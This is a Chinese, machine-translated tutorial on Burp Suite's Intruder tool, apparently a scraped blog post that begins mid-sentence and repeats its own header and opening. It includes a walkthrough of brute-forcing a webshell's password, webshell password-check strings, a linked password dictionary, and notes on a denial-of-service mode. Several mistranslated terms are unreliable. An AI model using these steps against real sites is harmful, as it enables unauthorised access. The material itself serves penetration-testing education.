，并添加一些测试字符串到列表中。您可以通过输入到“Enter a new item”框中，单击“add”，输入自己的字符串。或者您可以使用“add from file”下拉菜单，然后选择“Fuzzing-quick”，从内置的负载串[专业版]列表中。\n9)现在，您已经配置了最低限度的选项来发动攻击。转到Intruder菜单，然后选择“Start attack” 。\n10)在包含在结果选项卡一个新的窗口中打开攻击。结果表包含已经取得，与各关键细节，如所使用的有效载荷， HTTP状态码，响应长度等，您可以在表中选择任何项目，以查看完整的请求和响应每个请求的条目。您还可以对表进行排序通过单击列标题，并使用过滤器栏过滤表中的内容。这些特征以相同的方式工作，作为Proxy history。\n11)这次袭击窗口包含其他标签，显示被用于当前攻击的配置。您可以修改大部分这种配置的攻击已经开始。转到选项选项卡，向下滚动到“ grep-match” ，并勾选“标志的结果与项目相匹配的响应这些表达式” 。这将导致Intruder检查响应匹配列表中的每个表达式项目和标志的火柴。默认情况下，列表显示fuzzing时是很有用的一些常见的错误字符串，但可以配置，如果你想自己的字符串。返回result选项卡，看到Intruder增加了对每个项目列在列表中，而这些包含复选框，指示表达式是否被发现在每一个响应。如果你是幸运的，你的基本模糊测试可能引发一个错误的存在在一些回应的错误消息。\n12)现在，在表中选择任何项目，并期待在该项目的响应。发现在反应（如网页标题，或错误消息）一个有趣的字符串。右键单击该项目在表中，然后从上下文菜单中选择“Define extrace grep from response” 。在对话框中，选择响应的有趣字符串，然后单击“确定” 。结果表中现在包含一个新的列，其提取这一段文字从每个响应（其可以是不同的在每一种情况下） 。您可以使用此功能来定位在大型攻击有趣的数据与成千上万的反应。请注意，您还可以配置“extrace grep ”项目中的选项选项卡，在此之前前或在攻击期间。\n13)在结果表中选择任一项目，并打开上下文菜单。选择“Send to Repeater” ，然后转到Repeater选项卡。你会看到所选的请求已被复制到Repeater工具，进行进一步的测试。许多其他有用的选项是可用的上下文菜单中。有关发送BurpSuite工具之间的项目，使整体测试工作流程的详细信息。\n14)您可以使用“Save”菜单在结果窗口中都救不结果表或整个攻击。你可以加载结果表到其他工具或电子表格程序。您可以通过在主Burp的UI Intruder菜单重新加载保存的攻击。\n15)这些步骤只介绍一个简单的用例Intruder，对于Fuzzing的要求有一些标准的攻击字符串和用grep搜索中的错误消息。您可以使用Intruder许多不同类型的攻击，有许多不同的payloads和攻击选项。\n```\n\n### Using Burp Intruder\n\nfor example 这里我本地搭建一个环境，爆破一个php大马，如果是一句话就把get改成post，如果是php一句话，就在下面加上php这行代码，如图\n\n![Image091](https://wooyun.js.org/images_result/images/2014101711121444235.png \"image091.png\")\n\n```\nasp     password=execute(\"response.clear:response.write(\"\"passwordright\"\"):response.end\")\nphp     password=execute(\"response.clear:response.write(\"\"elseHelloWorld\"\"):response.end\")\naspx    password=execute(\"response.clear:response.write(\"\"elseHelloWorld\"\"):response.end\")。\n```\n\n一般步骤如下\n\n1.代理好服务器地址，然后访问这个大马地址\n\n![Image093](https://wooyun.js.org/images_result/images/2014101711121481236.png \"image093.png\")\n\n2.随后点击forward,并且在大马页面随便输入什么，burp拦截了数据之后发送到repeater\n\n![Image095](https://wooyun.js.org/images_result/images/2014101711121481236.png \"image095.png\")\n\n3.切换到repeater选项卡中，点击go按钮，找出一些反馈的错误信息，当然如果不要也可以，这里找错误信息是方便爆破成功了之后便于发现，我这个马反馈的是中文错误信息，显示是乱码就不写了，我们可以通过爆破成功了之后看字节数。 4.接下来就是发送到intruder，target一般都不需要管，已经自动填好了，然后选择positions\n\n![Image097](https://wooyun.js.org/images_result/images/2014101711121567189.png \"image097.png\")\n\n先点击Clear$，选择密码地地方点击add$。\n\n![Image099](https://wooyun.js.org/images_result/images/2014101711121551234.png \"image099.png\")\n\n5.切换到payloads设置payload type，选择我们自己的字典\n\n![Image101](https://wooyun.js.org/images_result/images/2014101711121532703.png \"image101.png\")\n\n6.切换到options去设置进程数和失败之后重试次数、过滤结果\n\n![Image103](https://wooyun.js.org/images_result/images/2014101711121554609.png \"image103.png\")\n\n一般我都会把Grep-Match清理掉，省得干扰。\n\n![Image105](https://wooyun.js.org/images_result/images/2014101711121599797.png \"image105.png\")\n\n7.接下来点击intruder下的start attack就开始爆破了，密码admin，我是根据length来判断跟其他的不同\n\n![Image107](https://wooyun.js.org/images_result/images/2014101711121647776.png \"image107.png\")\n\n附赠一个webshell字典：[shellpassword.txt.zip](https://wooyun.js.org/images_result/images/2014101711121696735.zip)\n\n### Target\n\n用于配置目标服务器进行攻击的详细信息。所需的选项有： Host(主机) - 这是目标服务器的IP地址或主机名。 Port(端口) - 这是HTTP / S服务的端口号。 Use HTTPS(使用HTTPS)，这指定的SSL是否应该被使用。 配置这些细节最简单的方法是选择你要攻击中BurpSuite的任何地方的请求，并选择上下文菜单中的“Send to intruder”选项。这将发送选定的请求，在intruder一个新的选项卡，将自动填充的目标和位置选项卡。\n\n### Positions\n\n用于配置request temlate的攻击，和payloads markers、attack type一起。\n\n### Request Template\n\n主要请求编辑器是用来定义从所有攻击请求都将被导出的请求模板。对于每一个攻击的请求，BurpSuite接受请求的模板，并把一个或多个有效载荷送入由有效载荷标记定义的位置。 成立请求模板的最简单的方法是选择你要攻击中BurpSuite的任何地方的请求，并选择上下文菜单中的“Send to intruder”选项。这将发送选定的请求，在intruder的选项卡，将自动填充的Target和Positions选项卡。\n\n### Payload Markers\n\n有效载荷的标记是使用§字符，并且功能如下放置：\n\n```\n1)每对标记指定一个有效载荷的位置。\n2)一对标记物可以从它们之间任选的模板要求附上一些文字。\n3)当一个有效载荷的位置被分配了一个有效载荷，无论是标记和任何包含的文本将被替换为有效载荷。\n4)当一个有效载荷的位置不具有分配的有效载荷，该标记将被删除，但是所包含的文本保持不变。\n```\n\n为了使配置更加简单，Intruder会自动突出显示每对有效载荷的标记和任何它们之间包含的文本。\n\n您可以手动或自动做有效载荷标记。当您从BurpSuite别处发送一个请求到Intruder，Intruder猜测你可能要放置有效载荷，并设置相应的有效载荷标记。您可以修改使用按钮的默认有效载荷标记旁边的请求模板编辑器：\n\nAdd§ - 如果没有文本被选中，该插入一个有效载荷标记在光标位置。如果您已经选择了一些文字，一对标记插入封闭选定的文本。 Clear§ - 这将删除所有的位置标记，无论是从整个模板或模板的选定部分。 Auto§ - 自动放置有效载荷标记。包括价值：\n\n```\n1)URL查询字符串参数\n2)车身参数\n3)曲奇饼\n4)多重参数属性（例如，在文件上传的文件名）\n5)XML数据和元素属性\n6)JSON参数\n```\n\n您可以配置自动负载位置是否将更换或追加到现有的参数值，通过入侵者菜单上的选项。需要注意的是，如果一个子部分的要求，但不是整个消息体，包含格式化数据使用XML或JSON ，可以自动通过这种结构中的位置的有效载荷手动选择格式化数据的准确块，并使用“自动”按钮在其定位的有效载荷。这是有用的，例如，当一个多参数的值包含在XML或JSON格式数据。\n\n```\n刷新 - 这将刷新请求模板编辑器的语法彩色化，如果必要的。\n清除 - 这会删除整个请求模板。\n```\n\n注意：您也可以使用入侵者的有效载荷仓的UI通过BurpSuite扫描仪配置自定义插入点主动扫描。要做到这一点，配置请求模板和有效载荷在标记内入侵者通常的方式，然后选择从入侵者菜单中的“主动扫描定义插入点” 。\n\n### Attack type\n\nBurp Intruder支持各种攻击类型 - 这些决定在何种负载分配给有效载荷仓的方式。攻击类型可以使用请求模板编辑器上方的下拉菜单进行选择。以下攻击类型可供选择：\n\n![Image109](https://wooyun.js.org/images_result/images/2014101711121998569.png \"image109.png\")\n\nSniper(狙击手) - 这将使用一套单一的payloads。它的目标依次在每个有效载荷的位置，并把每个有效载荷送入依次那个位置。这不是针对一个给定的请求的位置不受影响 - 位置标记被移除，并在它们之间出现在模板中任何封闭文本保持不变。这种攻击类型为个别模糊测试的一些请求参数常见的漏洞非常有用。在攻击中生成的请求的总数是位置的数目和在有效载荷中设定的有效载荷的数量的乘积。\n\nBattering ram(撞击物) - 使用一组payload。通过迭代的有效载荷方式，并将相同的payloads再一次填充到所有已定义的有效载荷仓。当其中一个攻击需要相同的输入将被插入在多个地方在请求中（例如，一个Cookie中的用户名和cookie参数）对这种攻击类型是非常有用的。在攻击中生成的请求的总数是有效载荷的有效载荷中设定的数目。\n\n![Image111](https://wooyun.js.org/images_result/images/2014101711121992842.png \"image111.png\")\n\n![Image113](https://wooyun.js.org/images_result/images/2014101711121957831.png \"image113.png\")\n\n例如生成一组数字1-9，则就是1-1 ，2-2，3-3这种形式 Pitchfork(相交叉) - 这将使用多个payloads集。有对每个定义的位置（最多20个）不同的有效载荷组。通过设置所有有效载荷的攻击迭代的方式，并将一个有效载荷到每个定义的位置。\n\n![Image115](https://wooyun.js.org/images_result/images/2014101711122127325.png \"image115.png\")\n\n![Image117](https://wooyun.js.org/images_result/images/2014101711122150222.png \"image117.png\")\n\n例如设置多个，每个payload设置一个字典，则就是1-1-1，2-2-2，3-3-3这种形式\n\n换句话说，第一个请求将放置第一个有效载荷的Payload set 1到Positions 1 ，并从有效载荷中的第一个Payload set 2到Positons 2 ;第二个请求将放置第二个Payload set 1到Positions 1 ，并从payload中的第二个Payload set 2到Postions2 ，等在那里的攻击需要不同但相关的输入进行插在多个地方，这种攻击类型是有用的请求（例如，用户名中的一个参数，和对应于该用户名中的另一个参数已知的ID号） 。在攻击中生成的请求的总数是有效载荷中的最小有效载荷组的数目。\n\nCluster bomb(集束炸弹) - 使用多个Payload sets。有对每个定义的Positions（最多20个）设置不同的payload set。通过每个有效载荷的攻击迭代依次设置，使有效载荷组合的所有排列进行测试。\n\n例如设置三个字典都是10个数，则总共有1000总匹配的模式\n\n![Image119](https://wooyun.js.org/images_result/images/2014101711122189353.png \"image119.png\")\n\n也就是说，如果有两个有效载荷的位置，则该攻击将放置第一个有效载荷从payload set 2到Positions 2 ，并通过在有效负载的所有 payload set 1中的positions 1 ;然后它将第二个有效载荷从载荷设置2到位置2 ，并通过有效载荷全部载入循环设置1到位置1 。其中一个攻击需要不同的和无关的或未知输入要在多个地方插入这种类型的攻击是非常有用的在请求中（例如猜测凭证，在一个参数的用户名，并且在另一个参数密码时） 。在攻击中生成的请求的总数是在所有定义的有效载荷的有效载荷集的数目的乘积 - 这可能是非常大的。\n\n## Payloads\n\n### Types\n\nBurp Intruder包含以下几种attack type:\n\n```\nSimple list--简单字典\nRuntime file--运行文件\nCustom iterator--自定义迭代器\nCharacter substitution--字符替换\n```\n\n此负载类型允许您配置一个字符串列表，并应用各种字符替换到每个项目。这可能是在密码猜测攻击非常有用，用来产生在字典中的单词常见的变化。 用户界面允许您配置了一些字符替换。当执行攻击，有效载荷类型工程通过逐一配置的列表项。对于每个项目，它产生一个数的有效载荷，根据所定义的取代基包括取代的字符的所有排列。例如，默认替换规则（其中包括e>3且t>7），该项目“peter”将产生以下的有效载荷：\n\n```\npeter\np3ter\npe7er\np37er\npet3r\np3t3r\npe73r\np373r\n```\n\nCase modification--此负载类型允许您配置一个字符串列表，并应用各种情况下修改每个项目。这可能是密码猜测攻击非常有用，用来产生在字典中的单词的情况下的变化。 可以选择以下的情况下修改规则：\n\n```\nNo change - 这个项目可以用不被修改。 \nTo lower case- 在该项目的所有字母转换为小写。 \nTo upper case - 在该项目的所有字母转换为大写。 \nTo Propername - 在该项目的第一个字母转换为大写，以及随后的字母转换为小写。 \nTo ProperName - 在该项目的第一个字母转换为大写，以及随后的字母都不会改变。\n```\n\n例如：\n\n```\nPeter Wiener\npeter wiener\nPETER WIENER\nPeter wiener\n```\n\n选项：\n\n```\nRecursive grep--递归grep\nIllegal Unicode--非法的Unicode\nCharacter blocks--字符块\nNumbers--数字\nDates--日期\nBrute forcer--暴力\nNull payloads--空的有效负载\nCharacter frobber--性格frobber\nBit flipper--位翻转\nUsername generator--用户名生成器\nECB block shuffler--欧洲央行座洗牌\nExtension-generated--扩展生成\nCopy other payload--复制其它有效负载\n```\n\n### Processing\n\n由配置的有效载荷类型生成的有效载荷可以使用各种有效载荷的处理规则和有效负载编码可以进一步操纵。\n\n#### 1)Payload Processing Rules\n\n在它被使用之前可以定义规则来对每个有效载荷执行各种处理任务。该定义的规则按顺序执行，并且可以打开和关闭，以帮助调试与配置的任何问题。有效载荷的处理规则是有用的在多种情况下，你需要生成不同寻常的有效载荷，或者需要在一个更广泛的结构或在使用前编码方案包的有效载荷可达。\n\n![Image121](https://wooyun.js.org/images_result/images/2014101711122171902.png \"image121.png\")\n\n```\nAdd prefix - 添加一个文字前缀\nAdd suffix - 添加一个文字后缀\nMatch/replace - 将替换匹配特定正则表达式的有效载荷的任何部位，用一个文字字符串表示。\nSubstring - 提取的有效载荷的子部分中，从指定的偏移量（0-索引）和至所指定的长度开始。\nReverse substring - 对于子规则来说，最终的偏移量指定的有效载荷的末尾向后计数，并且长度从端部向后偏移计数。\nModify case - 这个修改了的有效载荷的情况下，如果适用的话。同样的选项作为的情况下修改有效载荷类型。\nEncode - URL，HTML，Base64的，ASCII码或十六进制字符串构建各种平台：采用不同的计划，该编码的有效载荷。\nHash - hash\nAdd raw payload - 这之前或之后，在当前处理的值增加了原始负载值。它可以是有用的，例如，如果你需要提交相同的有效载荷在raw和哈希表。\nSkip raw payload - 将检查是否当前处理的值匹配指定的正则表达式，如果是这样，跳过有效载荷和移动到下一个。这可能是有用的，例如，如果知道一个参数值必须有一个最小长度和要跳过的一个列表，比这更短的长度的任何值。\nInvoke Burp extension - 调用一个Burp exxtension(扩展)来处理负载。扩展名必须已注册入侵者有效载荷处理器。您可以从已注册的当前加载的扩展可用的处理器列表中选择所需的处理器。\n```\n\n是规则的以下类型：\n\n#### 2)Payload Encoding\n\n你可以配置哪些有效载荷中的字符应该是URL编码的HTTP请求中的安全传输。任何已配置的URL编码最后应用，任何有效载荷处理规则执行之后。 这是推荐使用此设置进行最终URL编码，而不是一个有效载荷处理规则，因为可以用来有效载荷的grep选项来检查响应为呼应有效载荷的最终URL编码应用之前。...\n\n### Optins\n\n此选项卡包含了request headers，request engine，attack results ，grep match，grep\\_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。\n\n#### Request Headers\n\n这些设置控制在攻击Intruder(入侵者)是否更新配置请求头。请注意，您可以完全控制请求头通过在Payload positions(有效载荷位置)标签的要求范围内。这些选项可以用来更新每个请求的报头的方式，通常是有帮助的。\n\n下列选项可用：\n\nUpdate Content-length header(更新Content-Length头) - 此选项使Intruder(入侵者)添加或更新的Content-Length头的每个请求，与该特定请求的HTTP体的长度正确的值。此功能通常用于该插入可变长度的有效载荷送入模板的HTTP请求的主体的攻击至关重要。如果未指定正确的值，则目标服务器可能会返回一个错误，可能不完全响应请求，或者可能无限期地等待在请求继续接收数据。\n\nSet Connection:close(设置连接：关闭) - 此选项使Intruder(入侵者)添加或更新连接头的值为“close(关闭)” 。在某些情况下（当服务器本身并不返回一个有效的Content-Length或Transfer-Encoding头） ，这个选项可以让攻击更快速地执行。\n\n#### Request Engine\n\n设置控制用于发出HTTP请求中的Intruder(入侵者)攻击的Engine(引擎)。下列选项可用：\n\n```\nNumber of threads(执行进程数) - [专业版]该选项控制并发请求数的攻击。\nNumber of retries on network failure(网络故障的重试次数) - 如果出现连接错误或其他网络问题，Burp会放弃和移动之前重试的请求指定的次数。测试时间歇性网络故障是常见的，所以最好是在发生故障时重试该请求了好几次。\nPause before retry(重试前暂停) - 当重试失败的请求，Burp会等待指定的时间（以毫秒为单位） ，然后重试失败以下。如果服务器被宕机，繁忙，或间歇性的问题发生，最好是等待很短的时间，然后重试。\nThrottle between requests(请求之间的节流) - Burp可以在每次请求之前等待一个指定的延迟（以毫秒为单位） 。此选项很有用，以避免超载应用程序，或者是更隐蔽。或者，您可以配置一个可变延迟（与给定的初始值和增量） 。这个选项可以是有用的测试应用程序执行的会话超时时间间隔。\nStart time(开始时间) - 此选项允许您配置攻击立即启动，或在指定的延迟后，或开始处于暂停状态。如果攻击被配置，将在未来的某个时刻以供将来使用被执行，或保存这些替代品可能是有用的。\n```\n\n小心使用这些选项可让您微调攻击引擎，这取决于对应用程序性能的影响，并在自己的处理能力和带宽。如果您发现该攻击运行缓慢，但应用程序表现良好和你自己的CPU利用率很低，可以增加线程数，使你的攻击进行得更快。如果您发现连接错误发生，该应用程序正在放缓，或者说自己的电脑被锁定了，你应该减少线程数，也许增加网络故障和重试之间的间隔重试的次数。\n\n#### Attack Results\n\n这些设置控制哪些信息被捕获的攻击效果。下列选项可用：\n\n```\nStore requests/responses(存储请求/响应) - 这些选项确定攻击是否会保存单个请求和响应的内容。保存请求和响应占用磁盘空间，在你的临时目录中，但可以让您在攻击期间在众目睽睽这些，如果有必要重复单个请求，并将其发送到其他Burp工具。\nMake unmodified baseline request(未修改的基本请求) - 如果选择此选项，那么除了配置的攻击请求，Burp会发出模板请求设置为基值，所有有效载荷的位置。此请求将在结果表显示为项目＃ 0 。使用此选项很有用，提供一个用来比较的攻击响应基地的响应。\nUse denial-of-service mode(使用拒绝服务的模式) - 如果选择此选项，那么攻击会发出请求，如正常，但不会等待处理从服务器收到任何答复。只要发出的每个请求， TCP连接将被关闭。这个功能可以被用来执行拒绝服务的应用层对脆弱的应用程序的攻击，通过重复发送该启动高负荷任务的服务器上，同时避免通过举办开放套接字等待服务器响应锁定了本地资源的请求。\nStore full payloads(保存完整的有效载荷) - 如果选择此选项，Burp将存储全部有效载荷值的结果。此选项会占用额外的内存，但如果你想在运行时执行某些操作，如修改payload grep setting(有效负载值设置)，或重新发出请求与修改请求模板可能需要。\n```\n\n#### Grep-Match\n\n设置可用于包含在响应中指定的表达式标志结果的项目。对于配置列表中的每个项目，Burp会添加一个包含一个复选框，指出项目是否被发现在每个响应的新成果列。然后，您可以到组排序此列（通过单击列标题）匹配的结果相加。\n\n使用此选项可以是非常强大的，帮助分析大套的成绩，并迅速找出有趣的项目。例如，在口令猜测攻击，扫描短语，如“password incorrect(密码不正确)”或“login successful(登录成功)”，可以找到成功登录;在测试SQL注入漏洞，扫描含有“ ODBC ” ， “error(错误)”等消息可以识别易受攻击的参数。\n\n除了表达式匹配的列表，下列选项可用：\n\n```\nMatch(匹配类型) - 指定的表达式是否是简单的字符串或regular expressions(正则表达式)。\nCase sensitive match(区分大小写的匹配) - 指定检查表达式是否应区分大小写。\nExclude HTTP headers(不包括HTTP头) - 指定的HTTP响应头是否应被排除在检查。\n```\n\n#### Grep-Extrack\n\n可以被用来Extrack(提取)从反应有用的信息进入攻击结果的表。对于配置列表中的每个项目，Burp会添加一个包含提取该项目的文本的新成果列。然后，您可以排序此列（通过单击列标题）命令所提取的数据。例如我要匹配\n\n![Image123](https://wooyun.js.org/images_result/images/2014101711122144357.png \"image123.png\")\n\ninformation\\_schema这个表。则可以这样写，都是需要匹配唯一的那种，也可以使用正则，前提是你会写正则。在乌云社区有人提起过当时怎么匹配手机号，就可以从这里提取。\n\n![Image125](https://wooyun.js.org/images_result/images/2014101711122149847.png \"image125.png\")\n\n#### Grep-Payloads\n\n设置可用于含有所提交的有效载荷的反射标志的结果项。如果启用该选项，Burp会添加一个包含一个复选框，指示当前负载的值是否被发现在每个响应的新成果列。 （如果使用一个以上的有效载荷，单独的列将每个有效载荷集加。 ）\n\n此功能可以在检测跨站点脚本和其他应对注入漏洞，它可以出现在用户输入动态地插入到应用程序的响应是有用的。\n\n下列选项可用：\n\n```\nCase sensitive match(区分大小写的匹配) - 指定检查payload(负载)是否应区分大小写。\nExclude HTTP headers(不包括HTTP头) - 这指定的HTTP响应头是否应被排除在检查。\nMatch against pre-URL-encoded payloads(对预URL编码的有效载荷匹配) - 这是正常的配置Inturder(入侵者)请求中URL编码的有效载荷。然而，这些通常是由应用程序解码，回荡在他们的原始形式。您可以使用此选项，以用于有效载荷Burp检查反应在他们的预编码形式。\n```\n\n#### Redirections\n\n控制Burp在进行攻击时如何处理重定向。它往往是要遵循重定向来实现你的攻击目标。例如，在一个口令猜测攻击，每一次尝试的结果可能只能通过下面的重定向显示。模糊测试的时候，相关的反馈可能只出现在最初的重定向响应后返回的错误消息。\n\n下列选项可用： Follow redirections(跟随重定向) - 控制重定向都遵循的目标。下列选项可用：\n\n```\n1)Never(从来没有) - 入侵者不会遵循任何重定向。\n2)On-site only(现场唯一的) - 入侵者只会跟随重定向到同一个网页“网站” ，即使用相同的主机，端口和协议的是在原始请求使用的URL 。\n3)In-scope only(调查范围内的唯一) - Intruder只会跟随重定向到该套件范围的目标范围之内的URL 。\n4)Always(总是) - Intruder将遵循重定向到任何任何URL 。您应使用此选项时应谨慎 - 偶尔， Web应用程序在中继重定向到第三方的请求参数，并按照重定向你可能会不小心攻击。\n```\n\nProcess cookies in redirections(过程中的Cookie重定向) - 如果选择此选项，然后在重定向响应设置任何cookies将被当重定向目标之后重新提交。例如，如果你正在尝试暴力破解登录的挑战就可能是必要的，它总是返回一个重定向到一个页面显示登录的结果，和一个新的会话响应每个登录尝试创建。\n\nBurp会跟进到10链重定向，如果必要的。在结果表中的列将显示重定向是否其次为每个单独的结果，以及完整的请求和响应中的重定向链存储与每个结果的项目。重定向的类型Burp会处理（ 3xx的状态码，刷新头，等）配置在一套全重定向选项。\n\n注意重定向： 在某些情况下，可能需要下面的重定向时只使用一个单线程的攻击。出现这种情况时，应用程序存储会话中的初始请求的结果，并提供重定向响应时检索此。\n\n自动下重定向有时可能会造成问题 - 例如，如果应用程序响应一个重定向到注销页面的一些恶意的请求，那么下面的重定向可能会导致您的会话被终止时，它原本不会这么做。\n\n### Attacks\n\n当你配置完你的攻击设置时，你需要launch the attacks(发起攻击)，analyze the results(分析结果)，有时修改攻击配置，与您的测试工作流程链接，或进行其他操作。\n\n#### Launching an Attack\n\n攻击可以通过两种方式启动：\n\n```\n1)您可以配置Target(目标)，Positions(位置)，Payloads(有效载荷)和Options(选项卡)的攻击设置，然后选择从Intruder(入侵者)菜单“Start attack(开始攻击)”。 \n2)您可以通过从Intruder menu(入侵者菜单)中选择“previously saved attack(打开保存的攻击)”打开以前保存的攻击。 \n```\n\n在单独的窗口中每次攻击会打开。该窗口显示攻击为它们生成的结果，使您能够修改攻击配置实时，并与您的测试工作流程链接，或进行其他操作。\n\n#### Result Tab\n\n在结果选项卡包含在攻击发出的每个请求的全部细节。你可以过滤并标注此信息来帮助分析它，并使用它来驱动您的测试工作流程。\n\n#### 1)Results Table\n\nResults Table显示已在attack中所有的请求和响应的详细信息。根据不同的攻击配置，表可能包含以下几列，其中一些是默认隐藏的，可以使用Columns菜单 中取消隐藏：\n\n![Image127](https://wooyun.js.org/images_result/images/2014101711122190859.png \"image127.png\")\n\n![Image129](https://wooyun.js.org/images_result/images/2014101711122295512.png \"image129.png\")\n\nrequest 请求数 Position 有效载荷位置编号 Payload 有效载荷 Status http状态 Error 请求错误 Timeout 超时 Length 字节数 Comment 注释\n\n#### 2)Display Filter\n\n结果选项卡，可以用来隐藏某些内容从视图中，以使其更易于分析和对你感兴趣的工作内容显示过滤在结果表中。点击过滤器栏打开要编辑的过滤器选项。该过滤器可以基于以下属性进行配置：\n\n![Image131](https://wooyun.js.org/images_result/images/2014101711122263054.png \"image131.png\")\n\n```\nSearch term(检索词) - [专业版]您可以筛选反应是否不包含指定的搜索词。您可以设定搜索词是否是一个文字字符串或正则表达式，以及是否区分大小写。如果您选择了“negative search(消极搜索)”选项，然后不匹配的搜索词唯一的项目将被显示。\nStatus code(状态代码) - 您可以配置是否要显示或隐藏各种HTTP状态码响应。\nAnnotation(注释) - 您可以设定是否显示使用用户提供的评论或只重点项目。在结果表中显示的内容实际上是一个视图到基础数据库，并显示过滤器控制什么是包含在该视图。如果设置一个过滤器，隐藏一些项目，这些都没有被删除，只是隐藏起来，如果你取消设置相关的过滤器将再次出现。这意味着您可以使用筛选器来帮助您系统地研究一个大的结果集（例如，从模糊测试包含许多参数的要求）来理解各种不同的有趣的响应出现。\n```\n\n### Attack configuration Tabs\n\n在结果选项卡中，攻击窗口包含每个从它目前的攻击是基于主界面的配置选项卡中的克隆。这使您能够查看和修改攻击配置，同时进攻正在进行中。有关进一步详情，请参阅各配置选项卡的帮助：目标职位有效载荷选项当修改一个跑动进攻的配置，以下几点值得关注：攻击结构的某些部分是基本的攻击（如攻击类型和有效载荷类型）的结构，并且攻击已经开始之后不能改变。改变配置的某些部分攻击正在运行时，可能会有意想不到的效果。\n\n例如，如果您使用的是数量的有效载荷和编辑字段中，然后更改才会生效，因为每个键被按下;如果你最初从删除数字字段中，那么攻击可能会突然完成，因为要字段现在包含一个较小的数字。我们强烈建议您暂停修改它们的配置运行前的攻击。\n\n### Result Menus\n\n结果视图包含几个菜单命令与控制的攻击，并进行其他操作。这些将在下面说明。\n\n![Image133](https://wooyun.js.org/images_result/images/2014101711122362902.png \"image133.png\")\n\n![Image135](https://wooyun.js.org/images_result/images/2014101711122330940.png \"image135.png\")\n\n#### 1)Attack Menu(攻击菜单)\n\n包含的命令pause(暂停)，resume(继续)或repeat(重复)攻击。\n\n#### 2）Save Menu(保存菜单)\n\n```\nattack - 这是用来保存当前攻击的副本，包括结果。保存的文件可以使用从主Burp的UI Intruder菜单中的“打开保存的攻击”选项来重新加载。\nResults table - 这是用于对结果表保存为一个文本文件。你可以选择保存的所有行，或仅选定的行。您也可以选择要包括的列，列分隔符。此功能是有用的导出结果到电子表格中，以便进一步分析，或用于保存单个列（如使用提取的grep函数挖掘数据），以用作用于随后的攻击或其它工具的输入文件。\nServer responses - 这是用于保存收到的所有请求的全部应答。这些既可以被保存在单独的文件中（顺序编号）或串行级联的序列转换成一个单一的文件。\nAttack configuration - 这是用来保存当前正在执行攻击的配置（而不是结果）。您可以重新使用从主Burp的UI Intruder菜单中的“加载配置攻击”选项，攻击配置。\n```\n\n#### 3)Columns Menu(列菜单)\n\n这使您可以选择哪些可用的列是可见的攻击结果表。\n</style>","source":"_posts/Suite使用介绍（一）.md","raw":"---\ntitle: Burp Suite使用介绍（一）\ncover: https://img0.baidu.com/it/u=2259429094,2069555&fm=253&fmt=auto&app=120&f=JPEG?w=1422&h=800\nswiper_index: 10\ntop_group_index: 10\nbackground: '#fff'\ndate: 2025-03-20 23:02:02\nupdated:\ntags: 攻防知识\ncategories:\nkeywords:\ndescription:\ntop:\ntop_img:\ncomments:\ntoc:\ntoc_number:\ntoc_style_simple:\ncopyright:\ncopyright_author: 转载\ncopyright_author_href:\ncopyright_url:\ncopyright_info:\nmathjax:\nkatex:\naplayer:\nhighlight_shrink:\naside:\nai:\n---\n***\n\nBurp Suite 是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。本文主要介绍它的以下特点：\n\n```\n1.Target(目标)——显示目标目录结构的的一个功能\n2.Proxy(代理)——拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。\n3.Spider(蜘蛛)——应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。\n4.Scanner(扫描器)——高级工具，执行后，它能自动地发现web 应用程序的安全漏洞。\n5.Intruder(入侵)——一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。\n6.Repeater(中继器)——一个靠手动操作来触发单独的HTTP 请求，并分析应用程序响应的工具。\n7.Sequencer(会话)——用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。\n8.Decoder(解码器)——进行手动执行或对应用程序数据者智能解码编码的工具。\n9.Comparer(对比)——通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。\n10.Extender(扩展)——可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能。\n11.Options(设置)——对Burp Suite的一些设置\n```\n\n<!--more-->\n\n## 测试工作流程\n\nBurp支持手动的Web应用程序测试的活动。它可以让你有效地结合手动和自动化技术，使您可以完全控制所有的BurpSuite执行的行动，并提供有关您所测试的应用程序的详细信息和分析。 让我们一起来看看Burp Suite的测试流程过程吧。 如下图\n\n![Image001](https://wooyun.js.org/images_result/images/2014101711120074380.png \"image001.png\")\n\n## 简要分析\n\n代理工具可以说是Burp Suite测试流程的一个心脏，它可以让你通过浏览器来浏览应用程序来捕获所有相关信息，并让您轻松地开始进一步行动，在一个典型的测试中，侦察和分析阶段包括以下任务：\n\n手动映射应用程序-使用浏览器通过BurpSuite代理工作，手动映射应用程序通过以下链接，提交表单，并通过多步骤的过程加强。这个过程将填充代理的历史和目标站点地图与所有请求的内容，通过被动蜘蛛将添加到站点地图，可以从应用程序的响应来推断任何进一步的内容(通过链接、表单等)。也可以请求任何未经请求的站点(在站点地图中以灰色显示的)，并使用浏览器请求这些。\n\n在必要是执行自动映射-您可以使用BurpSuite自动映射过程中的各种方法。可以进行自动蜘蛛爬行，要求在站点地图未经请求的站点。请务必在使用这个工具之前，检查所有的蜘蛛爬行设置。\n\n使用内容查找功能发现，可以让您浏览或蜘蛛爬行可见的内容链接以进一步的操作。\n\n使用BurpSuite Intruder(入侵者)通过共同文件和目录列表执行自定义的发现，循环，并确定命中。\n\n注意，在执行任何自动操作之前，可能有必要更新的BurpSuite的配置的各个方面，诸如目标的范围和会话处理。\n\n分析应用程序的攻击面 - 映射应用程序的过程中填入代理服务器的历史和目标站点地图与所有的BurpSuite已抓获有关应用程序的信息。这两个库中包含的功能来帮助您分析它们所包含的信息，并评估受攻击面的应用程序公开。此外，您可以使用BurpSuite的目标分析器报告的攻击面的程度和不同类型的应用程序使用的URL 。\n\n接下来主要介绍下BurpSuite的各个功能吧。先介绍Proxy功能，因为Proxy起到一个心脏功能，所有的应用都基于Proxy的代理功能。\n\n## Burp Suite功能按钮键翻译对照\n\n|                                |           |                                        |                 |\n| ------------------------------ | --------- | -------------------------------------- | --------------- |\n| ### 导航栏                        